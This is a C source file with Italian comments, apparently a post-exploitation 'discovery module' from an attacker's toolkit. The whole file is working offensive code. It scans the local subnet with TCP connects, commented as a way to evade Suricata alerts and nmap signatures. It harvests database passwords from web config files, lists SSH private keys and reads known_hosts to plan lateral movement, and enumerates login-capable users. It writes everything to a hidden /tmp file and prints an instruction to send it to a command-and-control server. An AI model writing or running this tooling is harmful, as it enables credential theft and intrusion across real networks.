#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <dirent.h>
#include <errno.h>

/* ── Discovery Module ────────────────────────────────────────
 * Due fasi:
 * 1. Network scan — trova host attivi nella subnet
 * 2. Credential hunting — cerca credenziali sui file locali
 * Tutto implementato in C — nessun tool esterno
 */

#define OUTPUT_FILE "/tmp/.disc_results"
#define TIMEOUT_SEC 1

/* ── Ottieni IP e subnet correnti ───────────────────────────
 * Legge l'IP dell'interfaccia attiva da /proc/net/fib_trie
 */
int get_local_ip(char *ip_out, char *subnet_out) {
    FILE *fp = popen("ip addr show ens3 2>/dev/null | "
                     "grep 'inet ' | awk '{print $2}'", "r");
    if (!fp) return -1;

    char cidr[32];
    if (!fgets(cidr, sizeof(cidr), fp)) {
        pclose(fp);
        return -1;
    }
    pclose(fp);

    /* Rimuove il newline */
    cidr[strcspn(cidr, "\n")] = 0;

    /* Separa IP dalla maschera */
    char *slash = strchr(cidr, '/');
    if (!slash) return -1;

    *slash = '\0';
    strncpy(ip_out, cidr, 32);

    /* Calcola la subnet base (prendi i primi 3 ottetti) */
    strncpy(subnet_out, cidr, 32);
    char *last_dot = strrchr(subnet_out, '.');
    if (last_dot) *last_dot = '\0';

    return 0;
}

/* ── Network scan via TCP connect ───────────────────────────
 * Tenta connessione TCP su porte comuni
 * Più silenzioso di ICMP — non genera alert ICMP su Suricata
 * Nessun nmap — nessuna firma riconoscibile
 */
int tcp_scan(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return 0;

    struct timeval tv = { TIMEOUT_SEC, 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_aton(ip, &addr.sin_addr);

    int ret = connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    close(sock);
    return (ret == 0) ? 1 : 0;
}

/* ── Scan della subnet ───────────────────────────────────────
 * Scansiona tutti gli IP della subnet /24
 * Controlla le porte più rilevanti per il lateral movement
 */
void scan_network(const char *subnet, FILE *out) {
    int ports[] = { 22, 80, 443, 3306, 3389, 445, 8080, 0 };

    fprintf(out, "\n=== NETWORK SCAN: %s.0/24 ===\n", subnet);
    printf("[*] Scansione rete %s.0/24...\n", subnet);

    for (int i = 1; i < 255; i++) {
        char ip[32];
        snprintf(ip, sizeof(ip), "%s.%d", subnet, i);

        int open_ports[16];
        int n_open = 0;

        for (int j = 0; ports[j]; j++) {
            if (tcp_scan(ip, ports[j])) {
                open_ports[n_open++] = ports[j];
            }
        }

        if (n_open > 0) {
            fprintf(out, "HOST: %s — porte aperte: ", ip);
            printf("[+] Host trovato: %s — porte: ", ip);
            for (int j = 0; j < n_open; j++) {
                fprintf(out, "%d ", open_ports[j]);
                printf("%d ", open_ports[j]);
            }
            fprintf(out, "\n");
            printf("\n");

            /* Identifica il tipo di host */
            for (int j = 0; j < n_open; j++) {
                if (open_ports[j] == 22)
                    fprintf(out, "  → SSH disponibile (possibile pivot)\n");
                if (open_ports[j] == 3389)
                    fprintf(out, "  → RDP disponibile (Windows)\n");
                if (open_ports[j] == 445)
                    fprintf(out, "  → SMB disponibile (Windows/Samba)\n");
                if (open_ports[j] == 3306)
                    fprintf(out, "  → MySQL/MariaDB disponibile\n");
            }
        }
    }
}

/* ── Credential hunting ──────────────────────────────────────
 * Cerca credenziali nei file di configurazione
 * Pattern comuni per stack LAMP (Linux/Apache/MySQL/PHP)
 */
void hunt_credentials(FILE *out) {
    fprintf(out, "\n=== CREDENTIAL HUNTING ===\n");
    printf("[*] Ricerca credenziali...\n");

    /* Path comuni per file di configurazione PHP */
    const char *php_paths[] = {
        "/var/www/html",
        "/var/www",
        "/srv/www",
        "/opt/www",
        NULL
    };

    /* Pattern di credenziali da cercare */
    const char *patterns[] = {
        "DB_PASSWORD",
        "db_pass",
        "mysql_password",
        "database_password",
        "passwd",
        "password",
        "DB_USER",
        "db_user",
        NULL
    };

    for (int i = 0; php_paths[i]; i++) {
        if (access(php_paths[i], R_OK) != 0) continue;

        char cmd[512];
        for (int j = 0; patterns[j]; j++) {
            snprintf(cmd, sizeof(cmd),
                "grep -r '%s' %s --include='*.php' "
                "--include='*.conf' --include='*.env' "
                "--include='*.ini' -l 2>/dev/null",
                patterns[j], php_paths[i]);

            FILE *fp = popen(cmd, "r");
            if (!fp) continue;

            char filepath[512];
            while (fgets(filepath, sizeof(filepath), fp)) {
                filepath[strcspn(filepath, "\n")] = 0;

                /* Leggi le righe con il pattern */
                char grep_cmd[512];
                snprintf(grep_cmd, sizeof(grep_cmd),
                    "grep -n '%s' '%s' 2>/dev/null",
                    patterns[j], filepath);

                FILE *fp2 = popen(grep_cmd, "r");
                if (!fp2) continue;

                char line[512];
                while (fgets(line, sizeof(line), fp2)) {
                    line[strcspn(line, "\n")] = 0;
                    fprintf(out, "FILE: %s\n  → %s\n",
                            filepath, line);
                    printf("[+] Credenziale trovata in %s\n",
                           filepath);
                }
                pclose(fp2);
            }
            pclose(fp);
        }
    }
}

/* ── Cerca chiavi SSH ────────────────────────────────────────
 * Le chiavi SSH private sono il vettore principale
 * per il lateral movement silenzioso
 */
void hunt_ssh_keys(FILE *out) {
    fprintf(out, "\n=== SSH KEYS ===\n");
    printf("[*] Ricerca chiavi SSH...\n");

    const char *ssh_paths[] = {
        "/root/.ssh",
        "/home/debian/.ssh",
        "/home/www-data/.ssh",
        NULL
    };

    for (int i = 0; ssh_paths[i]; i++) {
        DIR *dir = opendir(ssh_paths[i]);
        if (!dir) continue;

        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (strstr(entry->d_name, "id_") ||
                strstr(entry->d_name, "known_hosts")) {

                char full_path[512];
                snprintf(full_path, sizeof(full_path),
                    "%s/%s", ssh_paths[i], entry->d_name);

                fprintf(out, "SSH FILE: %s\n", full_path);
                printf("[+] SSH file trovato: %s\n", full_path);

                /* Leggi known_hosts per mappare destinazioni */
                if (strstr(entry->d_name, "known_hosts")) {
                    FILE *kh = fopen(full_path, "r");
                    if (kh) {
                        char khline[512];
                        while (fgets(khline, sizeof(khline), kh)) {
                            fprintf(out, "  → %s", khline);
                        }
                        fclose(kh);
                    }
                }
            }
        }
        closedir(dir);
    }
}

/* ── Enumera utenti del sistema ─────────────────────────────
 * Trova utenti con shell valida — potenziali target
 */
void enum_users(FILE *out) {
    fprintf(out, "\n=== UTENTI DI SISTEMA ===\n");

    FILE *fp = popen("grep -v 'nologin\\|false' /etc/passwd | "
                     "cut -d: -f1,3,6", "r");
    if (!fp) return;

    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        fprintf(out, "%s", line);
    }
    pclose(fp);
}

/* ── Main ────────────────────────────────────────────────────  */
int main() {
    printf("[*] Discovery Module\n");
    printf("[*] Output: %s\n\n", OUTPUT_FILE);

    FILE *out = fopen(OUTPUT_FILE, "w");
    if (!out) {
        perror("fopen");
        return 1;
    }

    fprintf(out, "=== DISCOVERY RESULTS ===\n");
    fprintf(out, "Timestamp: ");
    fflush(out);
    system("date >> " OUTPUT_FILE);

    /* Ottieni IP locale */
    char local_ip[32], subnet[32];
    if (get_local_ip(local_ip, subnet) == 0) {
        printf("[*] IP locale: %s\n", local_ip);
        printf("[*] Subnet: %s.0/24\n\n", subnet);
        fprintf(out, "IP locale: %s\nSubnet: %s.0/24\n", 
                local_ip, subnet);

        /* Scan della rete */
        scan_network(subnet, out);
    }

    /* Credential hunting */
    hunt_credentials(out);

    /* SSH keys */
    hunt_ssh_keys(out);

    /* Utenti */
    enum_users(out);

    fclose(out);

    printf("\n[*] Discovery completato\n");
    printf("[*] Risultati salvati in %s\n", OUTPUT_FILE);
    printf("[*] Invia al C2 con: cat %s\n", OUTPUT_FILE);

    return 0;
}
